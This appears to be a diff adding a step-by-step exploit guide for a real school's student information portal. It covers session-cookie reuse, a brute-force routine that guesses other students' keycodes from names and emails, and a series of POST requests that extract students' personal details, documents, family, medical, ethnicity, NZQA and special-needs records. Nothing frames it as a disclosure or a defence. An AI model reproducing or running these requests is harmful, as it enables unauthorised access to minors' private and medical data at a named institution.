@@ -1,0 +1,174 @@
+[gaining authentication]
+
+at https://spider.scotscollege.school.nz/Spider2011/Pages/Login.aspx
+login with valid details, copy following cookies:
+.ASPXAUTH, ASP.NET_SessionId
+
+this can be done using an automation library, see Seleium
+
+to verify cookies:
+---
+POST: https://spider.scotscollege.school.nz/Spider2011/Handlers/Personalisation.asmx/GetPersonalisationFavouriteControl_ByMemberID
+data: {
+	"ControlID": "TIMETABLE",
+    "PageName": "Curriculum/Timetable/SearchStudentTimeTable.aspx"
+}
+---
+cookies ok if response is 200 and does not contain "Authentication fialed"
+
+
+[getting keycode]
+given: barcode, email, first_name, middle_name, last_name
+note, barcode is the 5-6 digit number on one's id card, we do not need all attributes
+
+# this function is *1* indexed
+func possibleKeycodes(barcode, email, fname, lname, mname) {
+    out = list()
+    if barcode {
+        # the keycode can be gained from the nzqa section in [crawling]
+    }
+    if email {c 1
+        length = email.size()
+
+		# given: rentonni@scotscollege...
+		# the (last_name, first_name) is either (rentonn, i) or (renton, ni) or (rento, nni)
+		# this tries all of them
+        pfname = list(
+            email.substring(1, length),
+            email.substring(1, length-1),
+            email.substring(1, length-2),
+        )
+        plname = list(
+             email.get(length),
+             email.substring(length-1, length),
+             email.substring(length-2, length),
+        )
+
+		# in the case of nick renton, the keycode is "renton n i", so we need this
+        out.add(email.substring(1, length-2) + " " + email.get(length-1) + " " + email.get(length))
+
+        each _, i of pfname {
+            out.add("\(pfname.get(i)) \(plname.get(i))")
+        }
+    }
+    if fname and lname {
+		# given: renton, nick
+		# the (last_name, first_name) is either (renton, n) or (renton, ni) or (renton, nic)
+
+        each _, i of range(3) {
+            out.add("\(lname) \(fname.substring(1, i))")
+        }
+
+		# in the case of nick renton, the keycode is "renton n i", so we need this
+        if fname.size() >= 2 {
+            out.add("\(lname) \(fname.get(fname.size()-1)) \(fname.get(fname.size()))")
+        }
+    }
+    if mname {
+		# this appends the middle_name to the end of all existing keycodes
+        @size = out.size()
+        for i = 1; i <= size; i++ {
+            out.add("\(out.get(i)) \(mname)")
+        }
+    }
+	# this is a bruteforce method to add a-z to the end of all guessed keycodes
+    @size = out.size()
+    each c of "abcdefghijklmnopqrstuvwxyz".split("") {
+        for i = 1; i <= size; i++ {
+            out.add("\(out.get(i))\(c)")
+            out.add("\(out.get(i)) \(c)")
+        }
+    }
+    return out
+}
+
+
+to see if a keycode is correct:
+---
+POST: https://spider.scotscollege.school.nz/Spider2011/Handlers/Timetable.asmx/GetTimeTable_ByStudentMode
+data: {
+	Date: "21/09/2021",
+    Mode: "STT",
+    StudentKey: <the_keycode>
+}
+---
+if the response is ok and response.data["d"] is not an empty array, the keycode is correct
+
+
+[crawling]
+we have access to:
+documents, family, medical, race, nzqa, achievements, special
+the details of these information are too long to describe here
+
+using keycode, do the following in series
+
+# personal information
+---
+POST: https://spider.scotscollege.school.nz/Spider2011/Handlers/Student.asmx/GetStudent_ByStudentKey
+data: {
+	"StudentKey": <the_keycode>
+}
+---
+barcode := response.data["d"]["Barcode"]
+
+# documents
+---
+POST: https://spider.scotscollege.school.nz/Spider2011/Handlers/DocumentManager.asmx/GetDocumentFolders
+data: {
+	"Key": <the_keycode>,
+	"OwnerType": "STUDENT",
+	"nUserID": <the_barcode>
+}
+---
+
+# family
+---
+POST: https://spider.scotscollege.school.nz/Spider2011/Handlers/Family.asmx/GetFamilyCaregivers_ByStudentKey_Member
+data: {
+	"Studkey": <the_keycode>,
+	"ShowNonDomicile": true
+}
+---
+
+# medical
+---
+POST: https://spider.scotscollege.school.nz/Spider2011/Handlers/Medical.asmx/GetMedicalHistory_ByStudentID
+data: {
+	"StudentID": <the_barcode>
+}
+---
+
+# race
+---
+POST: https://spider.scotscollege.school.nz/Spider2011/Handlers/Ethnicity.asmx/GetEthnicities_ByStudentID
+data: {
+	"StudentID": <the_barcode>
+}
+---
+
+# nzqa
+---
+POST: https://spider.scotscollege.school.nz/Spider2011/Handlers/NZAssessments.asmx/GetStudentNZQAResults
+data: {
+	"studentID": <the_barcode>
+}
+---
+keycode := response.d[0]["StudKey"]
+
+# achievements
+---
+POST: https://spider.scotscollege.school.nz/Spider2011/Handlers/Curriculum/LiveData/Achievements.asmx/GetStudentAchievements
+data: {
+	"studentID": <the_barcode>,
+	"analyticsCode": "ACH"
+}
+---
+
+# special
+---
+POST: https://spider.scotscollege.school.nz/Spider2011/Handlers/SpecialNeed.asmx/GetSpecialNeeds_ByStudentKey
+data: {
+	"StudentKey": <the_keycode>
+}
+---
+
